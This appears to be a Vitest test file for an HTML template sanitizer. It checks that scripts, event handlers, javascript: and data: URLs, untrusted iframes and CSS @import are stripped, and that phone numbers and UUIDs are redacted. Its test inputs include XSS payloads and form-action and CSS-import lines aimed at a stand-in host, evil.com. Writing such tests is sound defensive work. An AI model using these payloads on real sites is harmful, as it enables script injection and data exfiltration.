import { describe, it, expect } from "vitest";
import { sanitizeTemplateHtml, hasFormSlot, sanitizeForPreview } from "./template-sanitizer";

const VALID_HTML = `<div class="hero">
  <h1>Meu Template</h1>
  <p>Descrição do evento</p>
  {{FORM_SLOT}}
</div>`;

describe("hasFormSlot", () => {
  it("returns true when {{FORM_SLOT}} is present", () => {
    expect(hasFormSlot("{{FORM_SLOT}}")).toBe(true);
  });

  it("returns false when {{FORM_SLOT}} is absent", () => {
    expect(hasFormSlot("<div>no slot here</div>")).toBe(false);
  });
});

describe("sanitizeTemplateHtml", () => {
  it("throws on empty HTML", () => {
    expect(() => sanitizeTemplateHtml("")).toThrow("não pode estar vazio");
    expect(() => sanitizeTemplateHtml("   ")).toThrow("não pode estar vazio");
  });

  it("throws when {{FORM_SLOT}} is missing", () => {
    expect(() => sanitizeTemplateHtml("<div>no slot</div>")).toThrow(
      "deve conter a tag {{FORM_SLOT}}"
    );
  });

  it("preserves valid HTML structure", () => {
    const result = sanitizeTemplateHtml(VALID_HTML);
    expect(result).toContain("Meu Template");
    expect(result).toContain("{{FORM_SLOT}}");
    expect(result).toContain("hero");
  });

  it("removes script tags", () => {
    const html = `<div>{{FORM_SLOT}}</div><script>alert('xss')</script>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("alert");
  });

  it("removes event handlers", () => {
    const html = `<div onclick="alert('xss')" onload="evil()">{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("onclick");
    expect(result).not.toContain("onload");
  });

  it("removes javascript: URLs", () => {
    const html = `<a href="javascript:alert('xss')">click</a><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("javascript:");
  });

  it("neutralizes custom form tags (removes action/method, adds marker)", () => {
    const html = `<form action="https://evil.com" method="POST"><input name="email"></form><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    // Form é preservado (feature de forms customizados) mas neutralizado
    expect(result).toContain("data-vortex-custom-form");
    expect(result).not.toContain("action=");
    expect(result).not.toContain("method=");
    expect(result).not.toContain("https://evil.com");
  });

  it("removes object and embed tags", () => {
    const html = `<object data="evil.swf"></object><embed src="evil.swf"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("<object");
    expect(result).not.toContain("<embed");
  });

  it("removes iframes from non-whitelisted sources", () => {
    const html = `<iframe src="https://evil-site.com/malware"></iframe><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("evil-site");
  });

  it("preserves iframes from YouTube", () => {
    const html = `<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" allowfullscreen></iframe><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("youtube.com");
  });

  it("preserves iframes from Vimeo", () => {
    const html = `<iframe src="https://player.vimeo.com/video/123456789" allowfullscreen></iframe><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("vimeo.com");
  });

  it("redacts phone numbers", () => {
    const html = `<p>Meu telefone: (11) 99999-9999</p><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("99999-9999");
    expect(result).toContain("[REDACTED]");
  });

  it("redacts Brazilian phone numbers with country code", () => {
    const html = `<p>WhatsApp: 5511999999999</p><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("5511999999999");
    expect(result).toContain("[REDACTED]");
  });

  it("redacts UUIDs", () => {
    const html = `<p>Token: 550e8400-e29b-41d4-a716-446655440000</p><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("550e8400-e29b-41d4-a716-446655440000");
    expect(result).toContain("[REDACTED]");
  });

  it("preserves style tags (CSS sanitizado)", () => {
    const html = `<style>.hero { color: red; }</style><div class="hero">{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("<style>");
    expect(result).toContain(".hero { color: red; }");
    // CSS inline (atributo style) continua permitido
    expect(sanitizeTemplateHtml(`<div style="color: red">{{FORM_SLOT}}</div>`)).toContain("style=\"color: red\"");
  });

  it("removes @import from style tags (vetor de exfiltração via CSS)", () => {
    const html = `<style>@import url("https://evil.com/x.css"); .hero { color: red; }</style><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("@import");
    expect(result).not.toContain("evil.com");
    // CSS legítimo preservado
    expect(result).toContain(".hero { color: red; }");
  });

  it("removes expression() from style tags", () => {
    const html = `<style>.x { width: expression(alert(1)); }</style><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("expression");
  });

  it("preserves link stylesheets with http/https href", () => {
    const html = `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("fonts.googleapis.com");
    expect(result).toContain('rel="stylesheet"');
  });

  it("preserves link stylesheets with http (MinIO/VPS sem https)", () => {
    const html = `<link rel="stylesheet" href="http://minio.vps.local:9000/estilos.css"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("minio.vps.local");
  });

  it("removes link stylesheets with javascript: href", () => {
    const html = `<link rel="stylesheet" href="javascript:alert(1)"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("javascript:");
  });

  it("removes link stylesheets with data: href", () => {
    const html = `<link rel="stylesheet" href="data:text/css,body{display:none}"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("data:text/css");
  });

  it("removes non-stylesheet link tags", () => {
    const html = `<link rel="preload" href="https://evil.com/x.js"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("evil.com");
  });

  it("preserves img tags with safe attributes", () => {
    const html = `<img src="https://example.com/image.jpg" alt="Hero" width="800" height="600"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("example.com/image.jpg");
    expect(result).toContain('alt="Hero"');
  });

  it("removes data: URLs in img src", () => {
    const html = `<img src="data:image/svg+xml,<script>alert('xss')</script>"><div>{{FORM_SLOT}}</div>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).not.toContain("data:image");
  });

  it("preserves {{FORM_SLOT}} even when inside a neutralized form wrapper", () => {
    // {{FORM_SLOT}} é texto puro, sobrevive mesmo dentro de um form neutralizado
    const html = `<form>{{FORM_SLOT}}</form>`;
    const result = sanitizeTemplateHtml(html);
    expect(result).toContain("{{FORM_SLOT}}");
    // form é neutralizado (marcador adicionado, sem action/method)
    expect(result).toContain("data-vortex-custom-form");
    expect(result).not.toContain("action=");
    expect(result).not.toContain("method=");
  });
});

describe("sanitizeForPreview", () => {
  it("still removes event handlers in preview", () => {
    const html = `<div onclick="alert('xss')">{{FORM_SLOT}}</div>`;
    const result = sanitizeForPreview(html);
    expect(result).not.toContain("onclick");
  });

  it("preserves valid HTML structure in preview", () => {
    const html = `<div class="hero"><h1>Test</h1>{{FORM_SLOT}}</div>`;
    const result = sanitizeForPreview(html);
    expect(result).toContain("hero");
    expect(result).toContain("{{FORM_SLOT}}");
  });

  it("preserves safe SVG elements and attributes for social icons in preview", () => {
    const html = `<div class="social-links"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"></path></svg></div>`;
    const result = sanitizeForPreview(html);
    expect(result).toContain("<svg");
    expect(result).toContain("viewBox=");
    expect(result).toContain("<path");
    expect(result).toContain("stroke-width=");
  });
});
